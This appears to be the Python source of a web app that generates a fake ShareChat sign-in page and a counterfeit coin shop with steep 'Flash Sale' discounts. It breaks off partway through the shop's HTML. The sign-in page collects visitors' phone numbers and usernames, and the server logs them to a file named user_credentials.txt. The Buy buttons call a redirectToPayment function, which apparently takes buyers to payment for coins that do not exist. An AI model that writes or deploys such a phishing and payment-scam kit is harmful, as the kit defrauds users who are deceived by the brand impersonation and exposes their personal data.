# app.py - Render Deployment Version
import requests
import json
import time
import os
import logging
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import csv

class ShareChatLiveFetcher:
    def __init__(self):
        """
        Live ShareChat Profile Fetcher Tool - Render Version
        """
        # Render environment compatible API endpoint (original may be down)
        # You can update this with a working API URL
        self.api_url = "https://sharechat-coin-shop.vercel.app/api/profile-data"
        
        # Data files for Render (use /tmp directory for writable paths)
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.web_dir = os.path.join(self.base_dir, "web")
        self.data_dir = os.path.join("/tmp", "sharechat_data")  # Render compatible
        self.exports_dir = os.path.join("/tmp", "sharechat_exports")
        
        # Create directories (with Render compatibility)
        os.makedirs(self.web_dir, exist_ok=True)
        os.makedirs(self.data_dir, exist_ok=True)
        os.makedirs(self.exports_dir, exist_ok=True)
        
        # Files (using /tmp for Render)
        self.credentials_file = os.path.join(self.data_dir, "user_credentials.txt")
        self.results_file = os.path.join(self.data_dir, "results.json")
        self.log_file = os.path.join(self.data_dir, "sharechat.log")
        
        # Server settings for Render
        self.server_port = int(os.environ.get("PORT", 8080))  # Render provides PORT
        self.server_host = "0.0.0.0"  # Bind to all interfaces for Render
        self.server = None
        self.server_thread = None
        self.is_running = False
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
        # Session setup
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })
        
        # Store current results
        self.current_results = []
        
        # Check if index.html exists, if not create from your original HTML
        self.index_path = os.path.join(self.web_dir, "index.html")
        if not os.path.exists(self.index_path):
            self.create_your_index_html()
        
        # Create profile.html if not exists
        self.profile_path = os.path.join(self.web_dir, "profile.html")
        if not os.path.exists(self.profile_path):
            self.create_profile_html()
        
        self.logger.info(f"✅ Initialized for Render. Port: {self.server_port}, Host: {self.server_host}")
    
    def create_your_index_html(self):
        """
        आपका original index.html create करें (Render compatible)
        """
        # NOTE: The API endpoint in the JavaScript now points to your own backend
        html_content = '''<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in</title>

  <link href="https://fonts.googleapis.com/css?family=Inter:400,600,700&display=swap" rel="stylesheet">
  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📱</text></svg>">

  <style>
    /* (Same CSS styles as your original index.html) */
    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      margin: 0;
      padding: 0;
      background: #fff;
      font-family: 'Inter', Arial, sans-serif;
      color: #212936;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      overflow-x: hidden;
    }

    .container {
      max-width: 100%;
      width: 100%;
      margin: 0 auto;
      padding: 20px 24px 40px;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      min-height: -webkit-fill-available;
    }

    .logo {
      margin: 40px auto 28px;
      width: 80px;
      height: 80px;
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.07);
      background: white;
    }

    .logo-img {
      width: 74px;
      height: 74px;
      object-fit: contain;
      border-radius: 16px;
    }

    h1 {
      font-size: 1.75rem;
      font-weight: 700;
      margin-bottom: 8px;
      text-align: center;
      line-height: 1.3;
    }

    .subtitle {
      font-size: 0.95rem;
      margin-bottom: 28px;
      color: #6c757d;
      text-align: center;
      line-height: 1.4;
      padding: 0 10px;
    }

    .input-group {
      display: flex;
      width: 100%;
      margin-bottom: 18px;
      border: 1.5px solid #e0e2e6;
      border-radius: 10px;
      background: #fff;
      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);
      align-items: center;
      transition: all 0.2s ease;
    }

    .input-group:focus-within {
      border-color: #212936;
      box-shadow: 0 0 0 3px rgba(33, 41, 54, 0.1);
    }

    .input-group select,
    .input-group input {
      border: none;
      font-size: 1rem;
      padding: 14px 12px;
      outline: none;
      background: transparent;
      height: 52px;
      font-family: 'Inter', Arial, sans-serif;
      width: 100%;
      -webkit-appearance: none;
      appearance: none;
      color: #212936;
    }

    .input-group select {
      width: 85px;
      min-width: 85px;
      border-right: 1px solid #e0e2e6;
      font-weight: 600;
      text-align-last: center;
      padding-right: 8px;
      background: transparent;
      cursor: pointer;
    }

    .input-group input {
      flex: 1;
      min-width: 0;
    }

    input::placeholder {
      color: #9ca3af;
      opacity: 1;
    }

    .btn {
      width: 100%;
      font-size: 1.05rem;
      font-weight: 700;
      border-radius: 10px;
      padding: 16px 0;
      margin: 20px 0 10px;
      cursor: pointer;
      background: #212936;
      color: #fff;
      border: none;
      transition: all 0.2s ease;
      touch-action: manipulation;
      position: relative;
      overflow: hidden;
    }

    .btn:active,
    .btn:focus-visible {
      background: #3a4558;
      transform: translateY(1px);
      outline: none;
    }

    .btn:focus-visible {
      box-shadow: 0 0 0 3px rgba(33, 41, 54, 0.3);
    }

    .terms {
      font-size: 0.85rem;
      text-align: center;
      margin-bottom: 20px;
      line-height: 1.5;
      padding: 0 5px;
      color: #6b7280;
    }

    .terms a {
      color: #212936;
      font-weight: 700;
      text-decoration: underline;
      transition: color 0.2s ease;
    }

    .terms a:active {
      color: #3a4558;
    }

    .download-text {
      margin-top: 36px;
      font-size: 1rem;
      text-align: center;
      margin-bottom: 18px;
      font-weight: 600;
      color: #212936;
    }

    .app-badges {
      display: flex;
      justify-content: center;
      gap: 14px;
      flex-wrap: wrap;
    }

    .app-badges img {
      height: 42px;
      cursor: pointer;
      max-width: 100%;
      transition: transform 0.2s ease;
    }

    .app-badges img:active {
      transform: scale(0.98);
    }

    /* Loading state */
    .btn.loading {
      opacity: 0.8;
      pointer-events: none;
    }

    .btn.loading::after {
      content: '';
      position: absolute;
      width: 20px;
      height: 20px;
      top: 50%;
      left: 50%;
      margin: -10px 0 0 -10px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    /* Mobile optimizations */
    @media (max-width: 360px) {
      .container {
        padding: max(16px, env(safe-area-inset-top)) max(20px, env(safe-area-inset-right)) max(36px, env(safe-area-inset-bottom)) max(20px, env(safe-area-inset-left));
      }
      
      .logo {
        width: 72px;
        height: 72px;
        margin: 30px auto 24px;
      }
      
      .logo-img {
        width: 66px;
        height: 66px;
      }
      
      h1 {
        font-size: 1.6rem;
      }
      
      .subtitle {
        font-size: 0.9rem;
        margin-bottom: 24px;
      }
      
      .input-group select,
      .input-group input {
        height: 48px;
        padding: 12px 10px;
        font-size: 0.95rem;
      }
      
      .input-group select {
        width: 80px;
        min-width: 80px;
      }
      
      .btn {
        padding: 15px 0;
        font-size: 1rem;
      }
      
      .app-badges img {
        height: 38px;
      }
    }

    @media (min-width: 768px) {
      .container {
        max-width: 400px;
        padding: 32px 24px 48px;
        margin: 0 auto;
        justify-content: center;
      }
    }

    /* Safe area support for notch phones */
    @supports (padding: max(0px)) {
      .container {
        padding-left: max(24px, env(safe-area-inset-left));
        padding-right: max(24px, env(safe-area-inset-right));
        padding-bottom: max(40px, env(safe-area-inset-bottom));
      }
    }

    /* High contrast mode support */
    @media (prefers-contrast: high) {
      .input-group {
        border-width: 2px;
      }
      
      .btn {
        border: 2px solid #212936;
      }
    }

    /* Reduce motion */
    @media (prefers-reduced-motion: reduce) {
      * {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: 0.01ms !important;
      }
    }
  </style>
</head>

<body>
  <div class="container">

    <span class="logo">
      <img class="logo-img" src="https://cdn.iconscout.com/icon/free/png-256/free-sharechat-1136710.png" alt="ShareChat Logo" loading="lazy">
    </span>

    <h1>Sign in</h1>
    <div class="subtitle">मोबाइल नंबर और यूज़रनेम डालें</div>

    <form id="login-form" novalidate>

      <!-- Phone number -->
      <div class="input-group">
        <select aria-label="Country code">
          <option value="+91">+91</option>
        </select>
        <input 
          type="tel" 
          id="mobile" 
          placeholder="मोबाइल नंबर" 
          maxlength="10" 
          required 
          inputmode="numeric"
          pattern="[0-9]{10}"
          aria-label="मोबाइल नंबर"
          autocomplete="tel"
        >
      </div>

      <!-- Username -->
      <div class="input-group">
        <input 
          type="text" 
          id="username" 
          placeholder="यूज़रनेम" 
          required
          aria-label="यूज़रनेम"
          autocomplete="username"
        >
      </div>

      <div class="terms">
        By accepting this you agree to our
        <a href="#" aria-label="Terms and Conditions">Terms</a>,
        <a href="#" aria-label="Privacy Policy">Privacy</a>,
        <a href="#" aria-label="Content Policy">Content Policy</a>
      </div>

      <button type="submit" class="btn" id="submit-btn" aria-label="Submit form">
        Submit
      </button>
    </form>

    <!-- App Download Section -->
    <div class="download-text">शेयरचेट ऐप डाउनलोड करें</div>
    <div class="app-badges">
      <a href="https://play.google.com/store" aria-label="Download from Google Play Store">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play Store" loading="lazy">
      </a>
      <a href="https://apps.apple.com" aria-label="Download from App Store">
        <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store" loading="lazy">
      </a>
    </div>

  </div>

  <!-- Modified JavaScript to work with Render backend -->
  <script>
    const loginForm = document.getElementById('login-form');
    const submitBtn = document.getElementById('submit-btn');
    const mobileInput = document.getElementById('mobile');
    const usernameInput = document.getElementById('username');

    // Mobile number validation
    mobileInput.addEventListener('input', function(e) {
      this.value = this.value.replace(/\D/g, '').slice(0, 10);
    });

    // Form submission
    loginForm.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const mobile = mobileInput.value.trim();
      const username = usernameInput.value.trim();

      // Validation
      if (!/^\d{10}$/.test(mobile)) {
        alert("कृपया सही मोबाइल नंबर डालें (10 digits)");
        mobileInput.focus();
        return;
      }

      if (!username) {
        alert("कृपया यूज़रनेम डालें");
        usernameInput.focus();
        return;
      }

      // Show loading state
      submitBtn.classList.add('loading');
      submitBtn.disabled = true;

      try {
        // Store in localStorage
        localStorage.setItem("userMobile", mobile);
        localStorage.setItem("userUsername", username);
        localStorage.setItem("loginTime", new Date().toISOString());

        // Send data to our backend for profile fetching
        // Uses relative URL for Render deployment
        const response = await fetch('/fetch-profile', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            phone: mobile,
            username: username
          })
        });

        const result = await response.json();

        if (result.status === 'success') {
          // Store fetched profile data in localStorage for profile.html
          localStorage.setItem("fetchedProfileData", JSON.stringify(result.profile));
          localStorage.setItem("lastProfileFetchTime", new Date().getTime().toString());
          
          // Redirect to profile.html immediately
          window.location.href = "/profile.html";
        } else {
          alert("❌ Error: " + result.message);
          submitBtn.classList.remove('loading');
          submitBtn.disabled = false;
        }

      } catch (error) {
        console.error("Error:", error);
        alert("एरर आया है। कृपया दोबारा कोशिश करें।");
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
      }
    });

    // Handle Enter key navigation
    mobileInput.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        usernameInput.focus();
      }
    });

    usernameInput.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        submitBtn.click();
      }
    });

    // Check if we have saved data
    window.addEventListener('load', function() {
      // Test localStorage availability
      try {
        localStorage.setItem('test', 'test');
        localStorage.removeItem('test');
      } catch (e) {
        console.warn("LocalStorage not available:", e);
      }

      // Load saved data if exists
      const savedMobile = localStorage.getItem("userMobile");
      const savedUsername = localStorage.getItem("userUsername");
      
      if (savedMobile) {
        mobileInput.value = savedMobile;
      }
      if (savedUsername) {
        usernameInput.value = savedUsername;
      }
    });
  </script>
</body>
</html>'''
        
        with open(self.index_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        self.logger.info(f"✅ Created your original index.html at {self.index_path}")
    
    def create_profile_html(self):
        """
        profile.html create करें (पहले जैसा ही)
        """
        # Use the EXACT profile.html content you provided
        html_content = '''<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Profile Coins UI</title>
  
  <!-- Improved CSS with compatibility -->
  <style>
    * {
      box-sizing: border-box;
      -webkit-box-sizing: border-box;
      -moz-box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      margin: 0;
      padding: 0;
      background: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      -ms-flex-pack: center;
      justify-content: center;
      min-height: 100vh;
      min-height: -webkit-fill-available;
      overflow-x: hidden;
    }

    .app {
      width: 100%;
      max-width: 360px;
      background: #fff;
    }

    /* TOP CARD */
    .profile-card {
      background: #f8d257;
      margin: 16px;
      border-radius: 22px;
      padding: 20px 16px 24px;
      color: #fff;
      position: relative;
      -webkit-box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    }

    .share {
      position: absolute;
      top: 14px;
      right: 14px;
      font-size: 14px;
      background: rgba(255,255,255,0.2);
      padding: 6px 12px;
      border-radius: 20px;
      font-weight: 600;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
      border: none;
      color: #fff;
    }

    .level {
      width: 72px;
      height: 72px;
      background: #fff;
      border-radius: 50%;
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      -ms-flex-align: center;
      align-items: center;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      -ms-flex-pack: center;
      justify-content: center;
      font-size: 28px;
      font-weight: 700;
      margin: 0 auto 10px;
      color: #e9c41fc2;
      border: 4px solid rgba(255,255,255,0.6);
    }

    .level img {
      width: 60%;
      height: 60%;
      border-radius: 50%;
      -o-object-fit: cover;
      object-fit: cover;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    .user-id {
      text-align: center;
      font-size: 18px;
      font-weight: 700;
      word-break: break-word;
      padding: 0 10px;
    }

    .sub-id {
      text-align: center;
      font-size: 13px;
      opacity: 0.9;
      margin-top: 4px;
      word-break: break-all;
      padding: 0 10px;
    }

    .stats {
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-box-pack: justify;
      -webkit-justify-content: space-between;
      -ms-flex-pack: justify;
      justify-content: space-between;
      margin-top: 18px;
    }

    .stat-box {
      background: rgba(255,255,255,0.15);
      -webkit-box-flex: 1;
      -webkit-flex: 1;
      -ms-flex: 1;
      flex: 1;
      margin: 0 4px;
      border-radius: 12px;
      padding: 12px 6px;
      text-align: center;
    }

    .stat-box:first-child {
      margin-left: 0;
    }
    
    .stat-box:last-child {
      margin-right: 0;
    }

    .stat-number {
      font-size: 18px;
      font-weight: 700;
    }

    .stat-label {
      font-size: 12px;
      opacity: 0.9;
    }

    /* NEW OFFER CARD */
    .offer-card {
      margin: 0 16px 16px;
      border-radius: 16px;
      overflow: hidden;
      -webkit-box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      background: #fff;
    }

    .offer-card img {
      width: 100%;
      display: block;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    .buy-coins-bar {
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      -ms-flex-align: center;
      align-items: center;
      -webkit-box-pack: justify;
      -webkit-justify-content: space-between;
      -ms-flex-pack: justify;
      justify-content: space-between;
      padding: 10px 12px;
      border-top: 1px solid #eee;
    }

    .buy-left {
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      -ms-flex-align: center;
      align-items: center;
      gap: 10px;
    }

    .buy-left img {
      width: 32px;
      height: 32px;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    .buy-text {
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-box-orient: vertical;
      -webkit-box-direction: normal;
      -webkit-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
    }

    .buy-title {
      font-size: 15px;
      font-weight: 700;
      color: #000;
    }

    .buy-sub {
      font-size: 12px;
      color: #f59e0b;
      font-weight: 600;
    }

    .buy-time {
      font-size: 13px;
      font-weight: 700;
      color: #111;
      white-space: nowrap;
    }

    /* PACK LIST */
    .packs {
      padding: 8px 16px 24px;
    }

    .pack {
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      -ms-flex-align: center;
      align-items: center;
      -webkit-box-pack: justify;
      -webkit-justify-content: space-between;
      -ms-flex-pack: justify;
      justify-content: space-between;
      padding: 14px 0;
      border-bottom: 1px solid #eee;
    }

    .pack:last-child {
      border-bottom: none;
    }

    .pack-left {
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      -ms-flex-align: center;
      align-items: center;
      gap: 12px;
    }

    .coin {
      width: 36px;
      height: 36px;
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      -ms-flex-align: center;
      align-items: center;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      -ms-flex-pack: center;
      justify-content: center;
    }

    .coin img {
      width: 32px;
      height: 32px;
      -o-object-fit: contain;
      object-fit: contain;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    .pack-title {
      font-size: 16px;
      font-weight: 700;
    }

    .bonus {
      color: #16a34a;
      font-weight: 600;
      font-size: 14px;
    }

    .price {
      font-size: 14px;
      margin-top: 2px;
    }

    .old {
      text-decoration: line-through;
      color: #999;
      margin-left: 6px;
    }

    .off {
      color: #16a34a;
      font-size: 13px;
      margin-left: 6px;
    }

    .buy {
      background: #22c55e;
      color: #fff;
      border: none;
      padding: 8px 18px;
      border-radius: 8px;
      font-weight: 700;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
      -webkit-transition: all 0.2s ease;
      transition: all 0.2s ease;
    }

    .buy:active {
      background: #1ea34a;
      -webkit-transform: scale(0.98);
      transform: scale(0.98);
    }

    .value-tag {
      display: inline-block;
      background: #ff6a00;
      color: #fff;
      font-size: 12px;
      padding: 2px 8px;
      border-radius: 12px;
      margin-bottom: 6px;
    }
    
    .super-tag {
      display: inline-block;
      background: #d946ef;
      color: #fff;
      font-size: 12px;
      padding: 2px 8px;
      border-radius: 12px;
      margin-bottom: 6px;
    }
    
    .mega-tag {
      display: inline-block;
      background: #f59e0b;
      color: #fff;
      font-size: 12px;
      padding: 2px 8px;
      border-radius: 12px;
      margin-bottom: 6px;
    }

    /* Safe area support for newer Android */
    @supports (padding: max(0px)) {
      .packs {
        padding-bottom: max(24px, env(safe-area-inset-bottom, 24px));
      }
    }

    /* Dark mode support */
    @media (prefers-color-scheme: dark) {
      body {
        background: #121212;
      }
      
      .app {
        background: #1e1e1e;
      }
      
      .offer-card {
        background: #2d2d2d;
      }
      
      .buy-title {
        color: #fff;
      }
      
      .buy-time {
        color: #ddd;
      }
      
      .pack {
        border-bottom-color: #333;
      }
      
      .price {
        color: #ddd;
      }
    }

    /* Responsive for smaller screens */
    @media (max-width: 360px) {
      .app {
        max-width: 100%;
      }
      
      .profile-card {
        margin: 12px;
        padding: 16px 14px 20px;
      }
      
      .packs {
        padding-left: 12px;
        padding-right: 12px;
      }
      
      .pack-title {
        font-size: 15px;
      }
      
      .buy {
        padding: 7px 14px;
        font-size: 14px;
      }
    }

    /* High contrast mode */
    @media (prefers-contrast: high) {
      .buy {
        border: 2px solid #fff;
      }
      
      .share {
        border: 1px solid #fff;
      }
    }

    /* Reduce motion */
    @media (prefers-reduced-motion: reduce) {
      .buy {
        -webkit-transition: none;
        transition: none;
      }
    }
  </style>
</head>
<body>
  <div class="app">

    <div class="profile-card">
      <button class="share" onclick="logout()" aria-label="Logout">Logout</button>
      <div class="level">
        <img src="https://sharechat.com/assets/png/user.png" alt="User Profile" loading="lazy" id="userProfileImage">
      </div>
      <div class="user-id" id="userNameDisplay">ShareChatUser</div>
      <div class="sub-id" id="userHandleDisplay">@4280056142</div>

      <div class="stats">
        <div class="stat-box">
          <div class="stat-number" id="followersCount">6</div>
          <div class="stat-label">Follower</div>
        </div>
        <div class="stat-box">
          <div class="stat-number" id="followingCount">1</div>
          <div class="stat-label">Following</div>
        </div>
        <div class="stat-box">
          <div class="stat-number" id="postsCount">0</div>
          <div class="stat-label">Posts</div>
        </div>
      </div>
    </div>

    <!-- New Offer Card with Countdown -->
    <div class="offer-card">
      <img src="https://cdn4.sharechat.com/1dab1176_1697595288876_sc.jpeg" alt="Buy Coins Offer" loading="lazy">

      <div class="buy-coins-bar">
        <div class="buy-left">
          <img src="https://cdn.sharechat.com/1158c4d7_1646376498635_sc.webp" alt="coin-icon" loading="lazy">
          <div class="buy-text">
            <div class="buy-title">Buy Coins</div>
            <div class="buy-sub">Flash Sale is on</div>
          </div>
        </div>

        <!-- Time -->
        <div class="buy-time" id="countdown">12h : 36m</div>
      </div>
    </div>

    <div class="packs">
      <!-- Minimum Buy: ₹500 से शुरू -->
      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">3000 <span class="bonus">+600</span></div>
            <div class="price">₹250 <span class="old">₹600</span> <span class="off">58% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(250, '3000 Coins + 600 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">7500 <span class="bonus">+750</span></div>
            <div class="price">₹600 <span class="old">₹750</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(600, '7500 Coins + 750 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">10000 <span class="bonus">+1000</span></div>
            <div class="price">₹800 <span class="old">₹1000</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(800, '10000 Coins + 1000 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">15000 <span class="bonus">+1500</span></div>
            <div class="price">₹1200 <span class="old">₹1500</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(1200, '15000 Coins + 1500 Bonus')">Buy</button>
      </div>

      <!-- Value Pack -->
      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <span class="value-tag">Value Pack</span>
            <div class="pack-title">20000 <span class="bonus">+4000</span></div>
            <div class="price">₹1500 <span class="old">₹2000</span> <span class="off">25% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(1500, '20000 Coins + 4000 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">25000 <span class="bonus">+2500</span></div>
            <div class="price">₹2000 <span class="old">₹2500</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(2000, '25000 Coins + 2500 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">40000 <span class="bonus">+4000</span></div>
            <div class="price">₹3200 <span class="old">₹4000</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(3200, '40000 Coins + 4000 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">50000 <span class="bonus">+5000</span></div>
            <div class="price">₹4000 <span class="old">₹5000</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(4000, '50000 Coins + 5000 Bonus')">Buy</button>
      </div>

      <!-- Super Pack -->
      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <span class="super-tag">Super Pack</span>
            <div class="pack-title">75000 <span class="bonus">+15000</span></div>
            <div class="price">₹5000 <span class="old">₹7500</span> <span class="off">33% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(5000, '75000 Coins + 15000 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">100000 <span class="bonus">+10000</span></div>
            <div class="price">₹8000 <span class="old">₹10000</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(8000, '100000 Coins + 10000 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">150000 <span class="bonus">+15000</span></div>
            <div class="price">₹12000 <span class="old">₹15000</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(12000, '150000 Coins + 15000 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">200000 <span class="bonus">+20000</span></div>
            <div class="price">₹16000 <span class="old">₹20000</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(16000, '200000 Coins + 20000 Bonus')">Buy</button>
      </div>

      <!-- Super Pack -->
      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <span class="super-tag">Super Pack</span>
            <div class="pack-title">300000 <span class="bonus">+60000</span></div>
            <div class="price">₹20000 <span class="old">₹30000</span> <span class="off">33% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(20000, '300000 Coins + 60000 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">400000 <span class="bonus">+40000</span></div>
            <div class="price">₹32000 <span class="old">₹40000</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(32000, '400000 Coins + 40000 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">500000 <span class="bonus">+50000</span></div>
            <div class="price">₹40000 <span class="old">₹50000</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(40000, '500000 Coins + 50000 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
